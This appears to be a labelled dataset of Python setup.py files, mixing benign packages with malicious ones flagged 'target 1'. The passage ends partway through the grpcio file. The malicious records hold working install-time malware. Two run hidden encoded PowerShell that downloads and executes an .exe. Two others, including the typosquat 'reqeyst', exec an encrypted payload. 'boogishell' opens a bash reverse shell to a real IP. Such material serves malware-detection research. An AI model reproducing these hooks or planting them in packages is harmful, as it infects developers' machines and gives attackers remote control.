{"idx": "esqstudyedgrand-10.14", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstudyedgrand',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "capmonsterccloudclient-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'exBCqSUkgTFAenRjmDmtNunLfQinCQuITyQYUznTrVsoSH JBCORsxdPqkc'\nLONG_DESCRIPTION = 'EIeSwdNVKsZsWNmXuVMADMUNITPHnszVfQRhjTsZCSMsgXYVsw WdnEcFwFcsMYmHzkxQBcqIkhWSHLVvqqWznYrpzoRbab iklyhuMAAwNXjOUBEQyzbXVVbsnMBtSI fAGNWjeinqiLEFQMajciAYMeZInvjAYwPkiCNpidXrwBpkswIEUaIimHLatzq jsJcQAZiriVTQfApHwcJQSkGYKKJgJGyPGVzgBzYmxBFPeWfOqmWLPhHPjMr'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'gFCDOBB_OhR-9ImJmvSxt1-8JRYOH5c9IQyvjzGmltU=').decrypt(b'gAAAAABmA1mgKJ7-GZjtqJZB5qowIzPe83PQZOZFM1uj9h3740tcZjJvkLadYxVDUS7eHhJVrS6hs8CYgnIhUPMn1hTqFxOTCnmhjpQtRHQoMQtiTkvDmCgauiTW5nZJnaFxhlQeMixtcsMU28X32MxkH9B7ardKPx1GIRx4eIxX8b8yfWYQF9J1cYhdlnB4qPkv1AxcunMzMe3Dc2uVjkwKSv9OjaNWk5GwR7O7h73BpNmpYGPX6yg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"capmonsterccloudclient\",\n    version=VERSION,\n    author=\"TgkkwRswzCQNq\",\n    author_email=\"ErjhCMUiDQHfNTAnCMB@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "google-auth-2.10.0", "func": "# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\nDEPENDENCIES = (\n    \"cachetools>=2.0.0,<6.0\",\n    \"pyasn1-modules>=0.2.1\",\n    # rsa==4.5 is the last version to support 2.7\n    # https://github.com/sybrenstuvel/python-rsa/issues/152#issuecomment-643470233\n    'rsa<4.6; python_version < \"3.6\"',\n    'rsa>=3.1.4,<5; python_version >= \"3.6\"',\n    # install enum34 to support 2.7. enum34 only works up to python version 3.3.\n    'enum34>=1.1.10; python_version < \"3.4\"',\n    \"six>=1.9.0\",\n)\n\nextras = {\n    \"aiohttp\": [\n        \"aiohttp >= 3.6.2, < 4.0.0dev; python_version>='3.6'\",\n        \"requests >= 2.20.0, < 3.0.0dev\",\n    ],\n    \"pyopenssl\": \"pyopenssl>=20.0.0\",\n    \"reauth\": \"pyu2f>=0.1.5\",\n    # Enterprise cert only works for OpenSSL 1.1.1. Newer versions of these\n    # dependencies are built with OpenSSL 3.0 so we need to fix the version.\n    \"enterprise_cert\": [\"cryptography==36.0.2\", \"pyopenssl==22.0.0\"],\n}\n\nwith io.open(\"README.rst\", \"r\") as fh:\n    long_description = fh.read()\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"google/auth/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nsetup(\n    name=\"google-auth\",\n    version=version,\n    author=\"Google Cloud Platform\",\n    author_email=\"googleapis-packages@google.com\",\n    description=\"Google Authentication Library\",\n    long_description=long_description,\n    url=\"https://github.com/googleapis/google-auth-library-python\",\n    packages=find_packages(exclude=(\"tests*\", \"system_tests*\")),\n    namespace_packages=(\"google\",),\n    install_requires=DEPENDENCIES,\n    extras_require=extras,\n    python_requires=\">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*,!=3.5.*\",\n    license=\"Apache 2.0\",\n    keywords=\"google auth oauth client\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "dython-0.7.1.post4", "func": "import pathlib\nfrom setuptools import setup, find_packages\n\nHERE = pathlib.Path(__file__).parent.resolve()\n\nPACKAGE_NAME = 'dython'\nAUTHOR = 'Shaked Zychlinski'\nAUTHOR_EMAIL = 'shakedzy@gmail.com'\nURL = 'http://shakedzy.xyz/dython'\nDOWNLOAD_URL = 'https://pypi.org/project/dython/'\n\nLICENSE = 'MIT'\nVERSION = (HERE / \"VERSION\").read_text(encoding=\"utf8\").strip()\nDESCRIPTION = 'A set of data tools in Python'\nLONG_DESCRIPTION = (HERE / \"README.md\").read_text(encoding=\"utf8\")\nLONG_DESC_TYPE = \"text/markdown\"\n\nrequirements = (HERE / \"requirements.txt\").read_text(encoding=\"utf8\")\nINSTALL_REQUIRES = [s.strip() for s in requirements.split('\\n')]\n\ndev_requirements = (HERE / \"dev_requirements.txt\").read_text(encoding=\"utf8\")\nEXTRAS_REQUIRE = {\n      'dev': [s.strip() for s in dev_requirements.split('\\n')]\n}\n\nCLASSIFIERS = [\n      'Programming Language :: Python :: 3'\n]\nPYTHON_REQUIRES = '>=3.5'\n\nsetup(name=PACKAGE_NAME,\n      version=VERSION,\n      description=DESCRIPTION,\n      long_description=LONG_DESCRIPTION,\n      long_description_content_type=LONG_DESC_TYPE,\n      author=AUTHOR,\n      license=LICENSE,\n      author_email=AUTHOR_EMAIL,\n      url=URL,\n      download_url=DOWNLOAD_URL,\n      python_requires=PYTHON_REQUIRES,\n      install_requires=INSTALL_REQUIRES,\n      extras_require=EXTRAS_REQUIRE,\n      packages=find_packages(),\n      classifiers=CLASSIFIERS\n      )\n", "target": 0}
{"idx": "boogishell-0.1.0", "func": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop2',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n", "target": 1}
{"idx": "dodgy-0.2.1", "func": "# -*- coding: UTF-8 -*-\nfrom distutils.core import setup\n\nfrom setuptools import find_packages\n\nfrom dodgy import __pkginfo__\n\n_packages = find_packages(exclude=[\"*.tests\", \"*.tests.*\", \"tests.*\", \"tests\"])\n\n_short_description = \"Dodgy: Searches for dodgy looking lines in Python code\"\n\n_install_requires = []\n\n_classifiers = (\n    'Development Status :: 7 - Inactive',\n    'Environment :: Console',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: MIT License',\n    'Operating System :: Unix',\n    'Topic :: Software Development :: Quality Assurance',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n)\n\nsetup(\n    name='dodgy',\n    url='https://github.com/landscapeio/dodgy',\n    author='landscape.io',\n    author_email='code@landscape.io',\n    description=_short_description,\n    install_requires=_install_requires,\n    entry_points={\n        'console_scripts': [\n            'dodgy = dodgy.run:main',\n        ],\n    },\n    version=__pkginfo__.get_version(),\n    packages=_packages,\n    license='MIT',\n    keywords='check for suspicious code',\n    classifiers=_classifiers\n)\n", "target": 0}
{"idx": "fanstatic-1.2", "func": "from setuptools import setup, find_packages\n\nsetup(name='mydevpackage',\n      version='1.0.dev',\n      include_package_data=True,\n      zip_safe=False,\n      package_dir={'': 'src'},\n      packages=find_packages('src'),\n      install_requires=['setuptools', 'fanstatic'],\n      entry_points={\n          'fanstatic.libraries': [\n              'devfoo = mydevpackage:devfoo',\n          ]\n      })\n", "target": 0}
{"idx": "graphene-django-2.15.0", "func": "from setuptools import find_packages, setup\nimport sys\nimport ast\nimport re\n\n_version_re = re.compile(r\"__version__\\s+=\\s+(.*)\")\n\nwith open(\"graphene_django/__init__.py\", \"rb\") as f:\n    version = str(\n        ast.literal_eval(_version_re.search(f.read().decode(\"utf-8\")).group(1))\n    )\n\nrest_framework_require = [\"djangorestframework>=3.6.3\"]\n\n\ntests_require = [\n    \"pytest>=3.6.3\",\n    \"pytest-cov\",\n    \"coveralls\",\n    \"mock\",\n    \"pytz\",\n    \"django-filter<2;python_version<'3'\",\n    \"django-filter>=2;python_version>='3'\",\n    \"pytest-django>=3.3.2\",\n] + rest_framework_require\n\n\ndev_requires = [\n    \"black==19.10b0\",\n    \"flake8==3.7.9\",\n    \"flake8-black==0.1.1\",\n    \"flake8-bugbear==20.1.4\",\n] + tests_require\n\nsetup(\n    name=\"graphene-django\",\n    version=version,\n    description=\"Graphene Django integration\",\n    long_description=open(\"README.rst\").read(),\n    url=\"https://github.com/graphql-python/graphene-django\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 1.11\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n    ],\n    keywords=\"api graphql protocol rest relay graphene\",\n    packages=find_packages(exclude=[\"tests\", \"examples\", \"examples.*\"]),\n    install_requires=[\n        \"six>=1.10.0\",\n        \"graphene>=2.1.7,<3\",\n        \"graphql-core>=2.1.0,<3\",\n        \"Django>=1.11\",\n        \"singledispatch>=3.4.0.3\",\n        \"promise>=2.1\",\n        \"text-unidecode\",\n    ],\n    setup_requires=[\"pytest-runner\"],\n    tests_require=tests_require,\n    rest_framework_require=rest_framework_require,\n    extras_require={\n        \"test\": tests_require,\n        \"rest_framework\": rest_framework_require,\n        \"dev\": dev_requires,\n    },\n    include_package_data=True,\n    zip_safe=False,\n    platforms=\"any\",\n)\n", "target": 0}
{"idx": "ffmpy-0.3.0", "func": "from setuptools import setup\nfrom setuptools.command.test import test as TestCommand  # noqa\n\nfrom ffmpy import __version__\n\nsetup(\n    name=\"ffmpy\",\n    version=__version__,\n    description=\"A simple Python wrapper for ffmpeg\",\n    long_description=open(\"README.rst\").read(),\n    author=\"Andrii Yurchuk\",\n    author_email=\"ay@mntw.re\",\n    license=\"MIT\",\n    url=\"https://github.com/Ch00k/ffmpy\",\n    py_modules=[\"ffmpy\"],\n    classifiers=[\n        \"Topic :: Multimedia :: Sound/Audio\",\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: POSIX :: BSD\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Operating System :: MacOS :: MacOS X\",\n    ],\n    keywords=\"ffmpeg ffprobe wrapper audio video transcoding\",\n)\n", "target": 0}
{"idx": "libstringstringgame-3.18", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstringstringgame',\n    packages = ['modlib'],\n    version = '7.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "reqeyst-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'pSxhxghsjZhVVPBysvSr GmXCuEIcViaUFDuzfjoxiPrbdmJ'\nLONG_DESCRIPTION = 'FaixLBxmTukmVCxOEqwaujzUwhwNDREQBhKbGCEKwTvJGiDTvZKBxIDnHWeXcXsEpTHGhuRTrRDonEVLNvVunExPOTpvNNkUGRcKSTDlSCtFyrFzqP PmePmrQIXKWTsK ICSWGbUUYglOBNItRzk BCIzszIYmphdGHHdpYobUGPdaIzcNZErFgbQFz KarAWMCeuqUFHemZrowWSDZJXKKPzOKIlWSNeEaXMPzqPGYKYAvbKIWMOJuTseFruGyyZL kRs OULOtiAsUeRgBCFhqDFMbpr JbvqIdWlVSVtjumrhPDSPpDMdKroxyEiTiaUmHmxhyzunzQbgwCCCdqnaghOSVlfkCOr'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'BLeGN3YeLHO_CveTmbzoTcV2mMEeM7OLbB-KqOjVGz8=').decrypt(b'gAAAAABmA0cYuRRUKNFgWGQnV7wTDzW0ehaszDn33Rx4pPxQmXvhHbr1UVuz3iNJziT8DMHZkKCtZeIP6SWy1u6eqpmjDEg09a8fOI76aFTO9UDunsRrjqvUqhJubdRgkaezJhy3J-QmZmo0fHcWeHSH9Jg6DxqEXbN-vgtdHgCrtYtNtkkfy5AvI96ogo885o8ktLrWWWf0Nzvn3qFMyfKrXDwOTginiCjfKjqDdqiImHk7Yrt_vUg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"reqeyst\",\n    version=VERSION,\n    author=\"ajQOfGRgxavGbmM\",\n    author_email=\"mIqCyYLWltqZCj@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "grpcio-1.47.0", "func": "# Copyright 2015 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"A setup module for the GRPC Python package.\"\"\"\n\n# NOTE(https://github.com/grpc/grpc/issues/24028): allow setuptools to monkey\n# patch distutils\nimport setuptools  # isort:skip\n\n# Monkey Patch the unix compiler to accept ASM\n# files used by boring SSL.\nfrom distutils.unixccompiler import UnixCCompiler\n\nUnixCCompiler.src_extensions.append('.S')\ndel UnixCCompiler\n\nfrom distutils import cygwinccompiler\nfrom distutils import extension as _extension\nfrom distutils import util\nimport os\nimport os.path\nimport pathlib\nimport platform\nimport re\nimport shlex\nimport shutil\nimport subprocess\nfrom subprocess import PIPE\nimport sys\nimport sysconfig\n\nimport _metadata\nimport pkg_resources\nfrom setuptools.command import egg_info\n\n# Redirect the manifest template from MANIFEST.in to PYTHON-MANIFEST.in.\negg_info.manifest_maker.template = 'PYTHON-MANIFEST.in'\n\nPY3 = sys.version_info.major == 3\nPYTHON_STEM = os.path.join('src', 'python', 'grpcio')\nCORE_INCLUDE = (\n    'include',\n    '.',\n)\nABSL_INCLUDE = (os.path.join('third_party', 'abseil-cpp'),)\nADDRESS_SORTING_INCLUDE = (os.path.join('third_party', 'address_sorting',\n                                        'include'),)\nCARES_INCLUDE = (\n    os.path.join('third_party', 'cares', 'cares', 'include'),\n    os.path.join('third_party', 'cares'),\n    os.path.join('third_party', 'cares', 'cares'),\n)\nif 'darwin' in sys.platform:\n    CARES_INCLUDE += (os.path.join('third_party', 'cares', 'config_darwin'),)\nif 'freebsd' in sys.platform:\n    CARES_INCLUDE += (os.path.join('third_party', 'cares', 'config_freebsd'),)\nif 'linux' in sys.platform:\n    CARES_INCLUDE += (os.path.join('third_party', 'cares', 'config_linux'),)\nif 'openbsd' in sys.platform:\n    CARES_INCLUDE += (os.path.join('third_party', 'cares', 'config_openbsd'),)\nRE2_INCLUDE = (os.path.join('third_party', 're2'),)\nSSL_INCLUDE = (os.path.join('third_party', 'boringssl-with-bazel', 'src',\n                            'include'),)\nUPB_INCLUDE = (os.path.join('third_party', 'upb'),)\nUPB_GRPC_GENERATED_INCLUDE = (os.path.join('src', 'core', 'ext',\n                                           'upb-generated'),)\nUPBDEFS_GRPC_GENERATED_INCLUDE = (os.path.join('src', 'core', 'ext',\n                                               'upbdefs-generated'),)\nXXHASH_INCLUDE = (os.path.join('third_party', 'xxhash'),)\nZLIB_INCLUDE = (os.path.join('third_party', 'zlib'),)\nREADME = os.path.join(PYTHON_STEM, 'README.rst')\n\n# Ensure we're in the proper directory whether or not we're being used by pip.\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\nsys.path.insert(0, os.path.abspath(PYTHON_STEM))\n\n# Break import-style to ensure we can actually find our in-repo dependencies.\nimport _parallel_compile_patch\nimport _spawn_patch\nimport grpc_core_dependencies\n\nimport commands\nimport grpc_version\n\n_parallel_compile_patch.monkeypatch_compile_maybe()\n_spawn_patch.monkeypatch_spawn()\n\nLICENSE = 'Apache License 2.0'\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'License :: OSI Approved :: Apache Software License',\n]\n\n\ndef _env_bool_value(env_name, default):\n    \"\"\"Parses a bool option from an environment variable\"\"\"\n    return os.environ.get(env_name, default).upper() not in ['FALSE', '0', '']\n\n\nBUILD_WITH_BORING_SSL_ASM = _env_bool_value('GRPC_BUILD_WITH_BORING_SSL_ASM',\n                                            'True')\n\n# Export this environment variable to override the platform variant that will\n# be chosen for boringssl assembly optimizations. This option is useful when\n# crosscompiling and the host platform as obtained by distutils.utils.get_platform()\n# doesn't match the platform we are targetting.\n# Example value: \"linux-aarch64\"\nBUILD_OVERRIDE_BORING_SSL_ASM_PLATFORM = os.environ.get(\n    'GRPC_BUILD_OVERRIDE_BORING_SSL_ASM_PLATFORM', '')\n\n# Environment variable to determine whether or not the Cython extension should\n# *use* Cython or use the generated C files. Note that this requires the C files\n# to have been generated by building first *with* Cython support. Even if this\n# is set to false, if the script detects that the generated `.c` file isn't\n# present, then it will still attempt to use Cython.\nBUILD_WITH_CYTHON = _env_bool_value('GRPC_PYTHON_BUILD_WITH_CYTHON', 'False')\n\n# Export this variable to use the system installation of openssl. You need to\n# have the header files installed (in /usr/include/openssl) and during\n# runtime, the shared library must be installed\nBUILD_WITH_SYSTEM_OPENSSL = _env_bool_value('GRPC_PYTHON_BUILD_SYSTEM_OPENSSL',\n                                            'False')\n\n# Export this variable to use the system installation of zlib. You need to\n# have the header files installed (in /usr/include/) and during\n# runtime, the shared library must be installed\nBUILD_WITH_SYSTEM_ZLIB = _env_bool_value('GRPC_PYTHON_BUILD_SYSTEM_ZLIB',\n                                         'False')\n\n# Export this variable to use the system installation of cares. You need to\n# have the header files installed (in /usr/include/) and during\n# runtime, the shared library must be installed\nBUILD_WITH_SYSTEM_CARES = _env_bool_value('GRPC_PYTHON_BUILD_SYSTEM_CARES',\n                                          'False')\n\n# Export this variable to use the system installation of re2. You need to\n# have the header files installed (in /usr/include/re2) and during\n# runtime, the shared library must be installed\nBUILD_WITH_SYSTEM_RE2 = _env_bool_value('GRPC_PYTHON_BUILD_SYSTEM_RE2', 'False')\n\n# Export this variable to use the system installation of abseil. You need to\n# have the header files installed (in /usr/include/absl) and during\n# runtime, the shared library must be installed\nBUILD_WITH_SYSTEM_ABSL = os.environ.get('GRPC_PYTHON_BUILD_SYSTEM_ABSL', False)\n\n# Export this variable to force building the python extension with a statically linked libstdc++.\n# At least on linux, this is normally not needed as we can build manylinux-compatible wheels on linux just fine\n# without statically linking libstdc++ (which leads to a slight increase in the wheel size).\n# This option is useful when crosscompiling wheels for aarch64 where\n# it's difficult to ensure that the crosscompilation toolchain has a high-enough version\n# of GCC (we require >=5.1) but still uses old-enough libstdc++ symbols.\n# TODO(jtattermusch): remove this workaround once issues with crosscompiler version are resolved.\nBUILD_WITH_STATIC_LIBSTDCXX = _env_bool_value(\n    'GRPC_PYTHON_BUILD_WITH_STATIC_LIBSTDCXX', 'False')\n\n# For local development use only: This skips building gRPC Core and its\n# dependencies, including protobuf and boringssl. This allows \"incremental\"\n# compilation by first building gRPC Core using make, then building only the\n# Python/Cython layers here.\n#\n# Note that this requires libboringssl.a in the libs/{dbg,opt}/ directory, which\n# may require configuring make to not use the system openssl implementation:\n#\n#    make HAS_SYSTEM_OPENSSL_ALPN=0\n#\n# TODO(ericgribkoff) Respect the BUILD_WITH_SYSTEM_* flags alongside this option\nUSE_PREBUILT_GRPC_CORE = _env_bool_value('GRPC_PYTHON_USE_PREBUILT_GRPC_CORE',\n                                         'False')\n\n# If this environmental variable is set, GRPC will not try to be compatible with\n# libc versions old than the one it was compiled against.\nDISABLE_LIBC_COMPATIBILITY = _env_bool_value(\n    'GRPC_PYTHON_DISABLE_LIBC_COMPATIBILITY', 'False')\n\n# Environment variable to determine whether or not to enable coverage analysis\n# in Cython modules.\nENABLE_CYTHON_TRACING = _env_bool_value('GRPC_PYTHON_ENABLE_CYTHON_TRACING',\n                                        'False')\n\n# Environment variable specifying whether or not there's interest in setting up\n# documentation building.\nENABLE_DOCUMENTATION_BUILD = _env_bool_value(\n    'GRPC_PYTHON_ENABLE_DOCUMENTATION_BUILD', 'False')\n\n\ndef check_linker_need_libatomic():\n    \"\"\"Test if linker on system needs libatomic.\"\"\"\n    code_test = (b'#include <atomic>\\n' +\n                 b'int main() { return std::atomic<int64_t>{}; }')\n    cxx = shlex.split(os.environ.get('CXX', 'c++'))\n    cpp_test = subprocess.Popen(cxx + ['-x', 'c++', '-std=c++14', '-'],\n                                stdin=PIPE,\n                                stdout=PIPE,\n                                stderr=PIPE)\n    cpp_test.communicate(input=code_test)\n    if cpp_test.returncode == 0:\n        return False\n    # Double-check to see if -latomic actually can solve the problem.\n    # https://github.com/grpc/grpc/issues/22491\n    cpp_test = subprocess.Popen(\n        [cxx, '-x', 'c++', '-std=c++14', '-', '-latomic'],\n        stdin=PIPE,\n        stdout=PIPE,\n        stderr=PIPE)\n    cpp_test.communicate(input=code_test)\n    return cpp_test.returncode == 0\n\n\n# There are some situations (like on Windows) where CC, CFLAGS, and LDFLAGS are\n# entirely ignored/dropped/forgotten by distutils and its Cygwin/MinGW support.\n# We use these environment variables to thus get around that without locking\n# ourselves in w.r.t. the multitude of operating systems this ought to build on.\n# We can also use these variables as a way to inject environment-specific\n# compiler/linker flags. We assume GCC-like compilers and/or MinGW as a\n# reasonable default.\nEXTRA_ENV_COMPILE_ARGS = os.environ.get('GRPC_PYTHON_CFLAGS', None)\nEXTRA_ENV_LINK_ARGS = os.environ.get('GRPC_PYTHON_LDFLAGS', None)\nif EXTRA_ENV_COMPILE_ARGS is None:\n    EXTRA_ENV_COMPILE_ARGS = ' -std=c++14'\n    if 'win32' in sys.platform:\n        if sys.version_info < (3, 5):\n            EXTRA_ENV_COMPILE_ARGS += ' -D_hypot=hypot'\n            # We use define flags here and don't directly add to DEFINE_MACROS below to\n            # ensure that the expert user/builder has a way of turning it off (via the\n            # envvars) without adding yet more GRPC-specific envvars.\n            # See https://sourceforge.net/p/mingw-w64/bugs/363/\n            if '32' in platform.architecture()[0]:\n                EXTRA_ENV_COMPILE_ARGS += ' -D_ftime=_ftime32 -D_timeb=__timeb32 -D_ftime_s=_ftime32_s'\n            else:\n                EXTRA_ENV_COMPILE_ARGS += ' -D_ftime=_ftime64 -D_timeb=__timeb64'\n        else:\n            # We need to statically link the C++ Runtime, only the C runtime is\n            # available dynamically\n            EXTRA_ENV_COMPILE_ARGS += ' /MT'\n    elif \"linux\" in sys.platform:\n        EXTRA_ENV_COMPILE_ARGS += ' -fvisibility=hidden -fno-wrapv -fno-exceptions'\n    elif \"darwin\" in sys.platform:\n        EXTRA_ENV_COMPILE_ARGS += ' -stdlib=libc++ -fvisibility=hidden -fno-wrapv -fno-exceptions -DHAVE_UNISTD_H'\n\nif EXTRA_ENV_LINK_ARGS is None:\n    